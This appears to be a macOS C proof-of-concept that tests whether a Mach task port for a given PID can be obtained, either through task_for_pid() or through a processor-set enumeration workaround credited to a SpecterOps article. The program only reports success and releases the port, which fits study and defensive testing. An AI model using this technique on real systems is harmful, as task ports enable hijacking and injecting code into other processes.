#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>

static void print_usage(const char *prog) {
    fprintf(stderr, "Usage: %s <pid> | --whoami | --method <method>\n", prog);
    fprintf(stderr, "Methods:\n");
    fprintf(stderr, "  --method traditional    Use traditional task_for_pid() (default)\n");
    fprintf(stderr, "  --method wrapper       Use processor set enumeration wrapper\n");
}

// Alternative method to get task port using processor set enumeration
// Based on the technique described in the SpecterOps article
mach_port_t task_for_pid_wrapper(pid_t target_pid) {
    mach_port_t host_priv_port = MACH_PORT_NULL;
    mach_port_t default_processor_set = MACH_PORT_NULL;
    processor_set_name_array_t processor_sets = NULL;
    mach_msg_type_number_t processor_set_count = 0;
    mach_port_t processor_set_priv = MACH_PORT_NULL;
    task_array_t tasks = NULL;
    mach_msg_type_number_t task_count = 0;
    mach_port_t target_task = MACH_PORT_NULL;
    
    kern_return_t kr;
    
    // Step 1: Get host privileged port
    kr = host_get_host_priv_port(mach_host_self(), &host_priv_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get host privileged port: %d\n", kr);
        goto cleanup;
    }
    
    // Step 2: Get default processor set
    kr = processor_set_default(host_priv_port, &default_processor_set);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get default processor set: %d\n", kr);
        goto cleanup;
    }
    
    // Step 3: Get all processor sets
    kr = host_processor_sets(host_priv_port, &processor_sets, &processor_set_count);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get processor sets: %d\n", kr);
        goto cleanup;
    }
    
    // Step 4: Iterate through processor sets to find our target process
    for (mach_msg_type_number_t i = 0; i < processor_set_count; i++) {
        // Get privileged access to this processor set
        kr = host_processor_set_priv(host_priv_port, processor_sets[i], &processor_set_priv);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "Failed to get processor set priv for set %d: %d\n", i, kr);
            continue;
        }
        
        // Get all tasks in this processor set
        kr = processor_set_tasks(processor_set_priv, &tasks, &task_count);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "Failed to get tasks from processor set %d: %d\n", i, kr);
            mach_port_deallocate(mach_task_self(), processor_set_priv);
            continue;
        }
        
        // Check each task to see if it matches our target PID
        for (mach_msg_type_number_t j = 0; j < task_count; j++) {
            pid_t task_pid;
            kr = pid_for_task(tasks[j], &task_pid);
            if (kr == KERN_SUCCESS && task_pid == target_pid) {
                // Found our target! Get a send right to the task port
                // kr = mach_port_mod_refs(mach_task_self(), tasks[j], MACH_PORT_RIGHT_SEND, 1);
                // if (kr == KERN_SUCCESS) {
                //     target_task = tasks[j];
                //     printf("[+] Found target process %d in processor set %d\n", target_pid, i);
                //     goto cleanup;
                // }
                target_task = tasks[j];
                printf("[+] Found target process %d in processor set %d\n", target_pid, i);
                goto cleanup;
            }
        }
        
        // Clean up this processor set's resources
        for (mach_msg_type_number_t j = 0; j < task_count; j++) {
            mach_port_deallocate(mach_task_self(), tasks[j]);
        }
        vm_deallocate(mach_task_self(), (vm_address_t)tasks, task_count * sizeof(mach_port_t));
        mach_port_deallocate(mach_task_self(), processor_set_priv);
        tasks = NULL;
        task_count = 0;
    }
    
    if (target_task == MACH_PORT_NULL) {
        fprintf(stderr, "Target process %d not found in any processor set\n", target_pid);
    }

cleanup:
    // Clean up resources
    if (host_priv_port != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), host_priv_port);
    }
    if (default_processor_set != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), default_processor_set);
    }
    if (processor_sets != NULL) {
        vm_deallocate(mach_task_self(), (vm_address_t)processor_sets, processor_set_count * sizeof(mach_port_t));
    }
    
    return target_task;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 2;
    }
    
    if (strcmp(argv[1], "--whoami") == 0) {
        uid_t uid = getuid(), euid = geteuid();
        printf("uid=%u euid=%u\n", (unsigned)uid, (unsigned)euid);
        return 0;
    }
    
    if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
        print_usage(argv[0]);
        return 0;
    }
    
    // Parse command line arguments
    const char *method = "traditional";  // default method
    pid_t pid = -1;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--method") == 0) {
            if (i + 1 < argc) {
                method = argv[i + 1];
                i++;  // skip next argument
            } else {
                fprintf(stderr, "Error: --method requires a value\n");
                print_usage(argv[0]);
                return 2;
            }
        } else if (pid == -1) {
            // First non-option argument should be the PID
            pid = (pid_t)atoi(argv[i]);
        }
    }
    
    if (pid <= 1) {
        fprintf(stderr, "Error: Invalid or missing PID\n");
        print_usage(argv[0]);
        return 2;
    }
    
    // Validate method
    if (strcmp(method, "traditional") != 0 && 
        strcmp(method, "wrapper") != 0) {
        fprintf(stderr, "Error: Invalid method '%s'\n", method);
        print_usage(argv[0]);
        return 2;
    }

    mach_port_t task = MACH_PORT_NULL;
    kern_return_t kr;
    
    printf("Target PID: %d\n", pid);
    printf("Method: %s\n", method);
    printf("---\n");
    
    if (strcmp(method, "traditional") == 0) {
        // Only try traditional task_for_pid method
        printf("Trying traditional task_for_pid()...\n");
        kr = task_for_pid(mach_task_self(), pid, &task);
        
        if (kr == KERN_SUCCESS) {
            printf("SUCCESS with task_for_pid (task port: 0x%x)\n", task);
            mach_port_deallocate(mach_task_self(), task);
            return 0;
        } else {
            printf("FAIL: task_for_pid failed (%d)\n", kr);
            return 1;
        }
        
    } else if (strcmp(method, "wrapper") == 0) {
        // Only try processor set enumeration wrapper method
        printf("Trying processor set enumeration wrapper...\n");
        task = task_for_pid_wrapper(pid);
        
        if (task != MACH_PORT_NULL) {
            printf("SUCCESS with wrapper method (task port: 0x%x)\n", task);
            mach_port_deallocate(mach_task_self(), task);
            return 0;
        } else {
            printf("FAIL: Wrapper method failed to get task port\n");
            return 1;
        }
        
    } else {
        // Default behavior: use traditional method
        printf("Trying traditional task_for_pid()...\n");
        kr = task_for_pid(mach_task_self(), pid, &task);
        
        if (kr == KERN_SUCCESS) {
            printf("SUCCESS with task_for_pid (task port: 0x%x)\n", task);
            mach_port_deallocate(mach_task_self(), task);
            return 0;
        } else {
            printf("FAIL: task_for_pid failed (%d)\n", kr);
            return 1;
        }
    }
}
